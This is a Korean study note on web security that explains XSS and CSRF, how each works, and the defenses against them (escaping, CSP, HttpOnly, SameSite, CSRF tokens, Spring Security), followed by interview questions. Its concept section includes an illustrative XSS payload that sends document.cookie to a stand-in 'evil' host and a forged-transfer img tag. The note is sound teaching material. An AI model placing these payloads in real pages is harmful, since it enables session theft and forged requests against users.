---
id: xss-csrf
title: XSS와 CSRF
order: 4
aliases: [XSS, CSRF, 크로스 사이트 스크립팅, 사이트 간 요청 위조, SameSite, CSRF 토큰, CSP, HttpOnly]
card:
  one_line: 'XSS는 공격자의 스크립트가 내 사이트에서 실행되게 하는 것(방어: 출력 이스케이프·CSP·HttpOnly), CSRF는 로그인된 사용자의 브라우저가 공격자 사이트에서 내 서버로 요청을 보내게 하는 것(방어: SameSite 쿠키·CSRF 토큰)이다.'
  analogy: XSS는 게시판에 붙인 가짜 공지문에 "여기에 서명하세요"가 적힌 것(사이트 안에서 실행), CSRF는 내 도장을 든 비서에게 위조된 결재 서류를 슬쩍 끼워 넣는 것(도장=쿠키가 자동으로 찍힘)
  analogy_limit: 가짜 공지문은 눈으로 알아볼 수 있지만 XSS 스크립트는 화면에 안 보인다. 그리고 두 공격은 자주 같이 온다 — XSS로 심은 스크립트는 같은 출처라 CSRF 방어를 전부 통과한다.
  keywords: [XSS = 내 사이트에서 남의 스크립트, CSRF = 남의 사이트에서 내 쿠키, 출력 이스케이프 + SameSite]
flow:
  prev: { id: cors, reason: 출처를 속이거나 스크립트를 심는 공격 }
  next: { id: sql-injection, reason: 입력이 코드가 되는 또 하나의 자리 }
see_also: [cookie-session-jwt, cors, auth, http, mvc-request-flow]
checked: '2026-09-16'
sources:
  - 'OWASP — Cross Site Scripting (XSS), XSS Prevention Cheat Sheet — https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html'
  - 'OWASP — Cross-Site Request Forgery Prevention Cheat Sheet(Synchronizer Token, SameSite) — https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html'
  - 'MDN — Set-Cookie: SameSite(Lax 기본, Strict, None) — https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie/SameSite'
  - 'MDN — Content Security Policy (CSP) — https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP'
  - 'Spring Security 6 레퍼런스 — CSRF(기본 활성, 토큰 리포지토리, 언제 끄나) — https://docs.spring.io/spring-security/reference/servlet/exploits/csrf.html'
---

## 개념

**XSS**(크로스 사이트 스크립팅)는 공격자가 넣은 스크립트가 **내 사이트의 페이지 안에서** 다른 사용자의 브라우저에 실행되는 것이다. 게시글에 `<script>fetch('https://evil/?c=' + document.cookie)</script>`를 쓰고, 서버가 그 글을 이스케이프 없이 HTML에 그대로 넣으면, 글을 보는 모든 사용자의 브라우저가 그 스크립트를 내 사이트의 권한으로 실행한다. 방어의 핵심은 **출력할 때 이스케이프** — `<`를 `&lt;`로 바꿔 데이터가 코드가 되지 않게 하는 것이다. 템플릿 엔진(Thymeleaf, React JSX)은 기본으로 해 준다.

**CSRF**(사이트 간 요청 위조)는 로그인된 사용자가 공격자 사이트를 여는 순간, 그 페이지가 **내 서버로 요청을 보내게** 하는 것이다. `<img src="https://bank.example/transfer?to=evil&amt=100">` 한 줄이면 브라우저가 은행 쿠키를 자동으로 붙여 요청한다. 서버는 정상 사용자의 요청과 구분할 수 없다. 방어는 **"이 요청이 내 사이트에서 시작됐다"는 증거**를 요구하는 것 — 쿠키에 `SameSite`를 두어 다른 사이트에서 시작된 요청엔 쿠키가 안 붙게 하거나, 공격자가 알 수 없는 **CSRF 토큰**을 폼·헤더에 실어 보내게 한다.

#### 작동 과정 — CSRF 공격과 두 방어

- 사용자가 `bank.example`에 로그인 → 세션 쿠키 발급.
- 사용자가 다른 탭에서 `evil.example`을 연다. 그 페이지에 `<form action="https://bank.example/transfer" method="POST">`와 자동 제출 스크립트가 있다.
- 브라우저가 `POST /transfer`를 보낸다. 쿠키는 도메인 기준으로 자동 첨부 → 서버는 로그인된 사용자의 요청으로 본다 → 송금 실행. 이것이 CSRF.
- 방어 1, `SameSite=Lax` 쿠키: 다른 사이트에서 시작된 POST에는 쿠키가 안 붙는다 → 서버는 비로그인 요청으로 보고 401. (Lax는 최상위 GET 이동에는 붙이므로 GET으로 상태를 바꾸는 API가 있으면 뚫린다.)
- 방어 2, CSRF 토큰: 서버가 폼을 줄 때 세션에 묶인 난수 토큰을 숨은 필드로 넣고, POST에 그 토큰이 없거나 다르면 거부. `evil.example`은 동일 출처 정책 때문에 내 페이지를 읽어 토큰을 알아낼 수 없다.
- 결과: 어느 쪽이든 "다른 사이트에서 시작된 요청"이 걸러진다. 둘을 같이 쓰는 것이 권장(심층 방어).

#### 비교 — XSS와 CSRF

| | XSS | CSRF |
|---|---|---|
| 스크립트가 도는 곳 | 내 사이트(피해자 브라우저에서 내 출처로) | 공격자 사이트(요청만 내 서버로) |
| 공격자가 얻는 것 | 세션·토큰 탈취, 페이지 조작, 사용자 대신 아무 요청 | 사용자 권한으로 정해진 요청 하나(응답은 못 읽음) |
| 뚫리는 조건 | 입력을 이스케이프 없이 출력 | 쿠키만으로 인증 + 다른 사이트 요청에 쿠키가 붙음 |
| 핵심 방어 | 출력 이스케이프, CSP, `HttpOnly` 쿠키 | `SameSite` 쿠키, CSRF 토큰, 상태 변경은 POST |
| 관계 | XSS가 있으면 CSRF 방어는 무력(같은 출처에서 토큰을 읽을 수 있음) | |

## 왜 나왔나

웹의 두 가지 편의가 원인이다. 첫째, HTML은 데이터와 코드를 같은 텍스트에 섞는다 — 사용자 입력을 그대로 페이지에 넣으면 입력이 코드가 된다(XSS). 둘째, 브라우저는 요청에 쿠키를 자동으로 붙이고, `<img>`·`<form>`은 동일 출처 정책의 예외라 다른 사이트로 요청을 보낼 수 있다(CSRF). 두 편의를 없앨 수는 없어서, "출력할 때 데이터를 데이터로 남기기"와 "요청이 내 사이트에서 시작됐음을 증명하기"라는 방어가 각각 자리 잡았다. `SameSite`(2016년 제안, 2020년 Chrome 기본 Lax)는 브라우저 차원에서 CSRF를 거의 없앴지만 오래된 브라우저와 GET 상태 변경이 남아 토큰이 여전히 쓰인다.

## 확인 질문

- 설명해 보기: XSS 방어에서 "입력 검증"보다 "출력 이스케이프"가 핵심인 이유는?
  답: 같은 데이터도 HTML 본문·속성·URL·JS 문자열 등 들어가는 자리마다 위험한 문자가 다르다. 출력 자리에 맞춰 이스케이프해야 데이터가 코드로 해석되지 않는다. 입력 검증은 보조다.
- 다음 상태 예측: 세션 쿠키가 `SameSite=Lax`인데 `GET /orders/42/cancel`이 주문을 취소한다면?
  답: Lax는 최상위 탐색 GET에는 쿠키를 붙이므로 `<a href>`나 리다이렉트로 CSRF가 된다. 상태를 바꾸는 요청은 GET으로 만들지 않는다.
- 다음 상태 예측: JWT를 `localStorage`에 두고 `Authorization` 헤더로 보내는 SPA는 CSRF·XSS에 각각 어떤가?
  답: 브라우저가 자동으로 붙이지 않으니 CSRF는 안 된다. 대신 XSS가 나면 스크립트가 `localStorage`를 읽어 토큰을 훔친다. `HttpOnly` 쿠키는 그 반대(XSS로 못 읽지만 CSRF 방어 필요).

## 심화

### XSS 세 종류와 자리별 이스케이프

저장형(DB에 저장된 글이 모두에게), 반사형(URL 파라미터가 응답에 그대로), DOM형(서버는 무관하고 프런트 스크립트가 `innerHTML`에 입력을 넣음). 방어는 출력 자리에 맞춘 이스케이프 — HTML 본문은 `&lt;` 등 5개 문자, 속성은 따옴표 안에 두고 이스케이프, URL은 인코딩, JS 안에는 아예 넣지 않는다. Thymeleaf `th:text`(안전)와 `th:utext`(안 함), React `{}`(안전)와 `dangerouslySetInnerHTML`(안 함)의 구분. 사용자가 HTML을 써야 하면(에디터) 허용 목록 기반 정화기(OWASP Java HTML Sanitizer)를 쓴다.

### CSP와 HttpOnly — 뚫려도 피해를 줄이기

`Content-Security-Policy: script-src 'self'`는 인라인 스크립트와 외부 출처 스크립트를 브라우저가 거부하게 해, 이스케이프를 빠뜨려도 실행을 막는다(nonce·hash로 허용). 세션 쿠키에 `HttpOnly`를 두면 스크립트가 `document.cookie`로 못 읽어 세션 탈취를 막는다 — 다만 스크립트가 사용자 대신 요청을 보내는 것은 못 막는다. `Secure`, `SameSite`와 세트로 둔다.

### 스프링 시큐리티의 CSRF

기본으로 켜져 있고, 상태를 바꾸는 메서드(POST·PUT·DELETE·PATCH)에 `_csrf` 파라미터나 `X-CSRF-TOKEN` 헤더의 토큰을 요구한다. Thymeleaf 폼은 자동으로 넣어 준다. SPA는 `CookieCsrfTokenRepository.withHttpOnlyFalse()`로 토큰을 쿠키에 두고 스크립트가 읽어 헤더로 보내는 방식(double submit). **끄는 조건**: 쿠키가 아니라 `Authorization` 헤더로만 인증하는 순수 API 서버 — 브라우저가 자동으로 붙이는 게 없으면 CSRF가 성립하지 않는다. 쿠키 세션을 쓰면서 "귀찮아서" 끄는 것은 취약점이다.

### 실무에서는

- 템플릿의 이스케이프 우회(`th:utext`, `dangerouslySetInnerHTML`, `v-html`)를 코드 리뷰에서 반드시 본다.
- 세션 쿠키: `HttpOnly; Secure; SameSite=Lax`(또는 Strict). 인증 쿠키를 다른 사이트에서 써야 하면 `SameSite=None; Secure`와 CSRF 토큰.
- 상태를 바꾸는 API는 POST·PUT·DELETE. GET으로 삭제하는 링크를 만들지 않는다.
- JWT를 localStorage에 두는 설계는 XSS 한 번에 토큰이 새므로, `HttpOnly` 쿠키 + SameSite + 짧은 만료가 더 안전한 기본이다.
- 업로드 파일 이름·확장자·`Content-Type`을 그대로 응답에 쓰면 저장형 XSS 통로가 된다. `X-Content-Type-Options: nosniff`.

### 면접 질문

#### XSS와 CSRF의 차이와 각각의 방어 방법을 설명해 주세요.

XSS는 공격자의 스크립트가 내 사이트의 출처로 다른 사용자의 브라우저에서 실행되는 것이고, CSRF는 로그인된 사용자의 브라우저가 공격자 사이트에서 내 서버로 요청을 보내게 하는 것입니다. XSS 방어는 출력 자리에 맞는 이스케이프(템플릿 기본값을 우회하지 않기)와 CSP·`HttpOnly` 쿠키, CSRF 방어는 `SameSite` 쿠키와 요청마다 검증하는 CSRF 토큰, 그리고 상태 변경을 GET으로 하지 않는 것입니다.
XSS는 "입력이 코드가 된다", CSRF는 "쿠키가 자동으로 붙는다"는 웹의 특성에서 오므로 방어도 각각 "데이터를 데이터로 출력"과 "내 사이트에서 시작된 요청임을 증명"입니다.
예를 들어 게시글의 `<script>`가 그대로 렌더링되면 XSS, `<img src="bank/transfer?…">`로 송금되면 CSRF입니다. 한계는 XSS가 있으면 같은 출처에서 CSRF 토큰을 읽을 수 있어 CSRF 방어가 무력해지고, `SameSite=Lax`는 최상위 GET에는 쿠키를 붙여 GET 상태 변경 API가 있으면 뚫린다는 점입니다.

- 오답: "입력 검증(특수문자 금지)으로 XSS를 막는다" — 자리마다 위험 문자가 달라 출력 이스케이프가 핵심이고, 입력 검증은 보조다.
- 오답: "HttpOnly 쿠키면 XSS는 문제없다" — 쿠키를 못 읽을 뿐 스크립트가 사용자 대신 요청을 보내는 것은 막지 못한다.
- 꼬리: SameSite의 Lax와 Strict의 차이는?
- 꼬리: CSP는 어떻게 XSS 피해를 줄이나요?

#### JWT를 쓰는 SPA에서 CSRF 방어를 꺼도 되나요? 토큰은 어디에 저장해야 하나요?

토큰을 `Authorization` 헤더로만 보내면 브라우저가 자동으로 붙이는 것이 없어 CSRF가 성립하지 않으므로 끌 수 있습니다. 하지만 그 토큰을 `localStorage`에 두면 XSS 한 번에 스크립트가 읽어 탈취되므로, `HttpOnly; Secure; SameSite` 쿠키에 두는 것이 더 안전하고 그 경우 CSRF 방어(SameSite + 토큰)는 다시 필요합니다.
CSRF는 "자동 첨부"에서, XSS 탈취는 "스크립트 접근 가능"에서 오므로, 저장 위치를 고르는 것은 둘 중 어느 위험을 받아들일지 고르는 것입니다.
현실적 절충은 액세스 토큰은 짧게 두어 메모리(변수)에만 갖고, 리프레시 토큰은 `HttpOnly` 쿠키로 두어 재발급 엔드포인트만 CSRF 방어를 하는 것입니다. 한계는 어느 방식이든 XSS를 막지 못하면 사용자 대신 요청을 보내는 것까지는 막을 수 없으므로, 이스케이프·CSP가 전제라는 점입니다.

- 오답: "JWT면 무조건 CSRF에 안전하다" — JWT를 쿠키에 담아 보내면 세션 쿠키와 똑같이 CSRF 대상이다.
- 꼬리: Spring Security에서 CSRF를 끄는 것이 정당한 조건은?
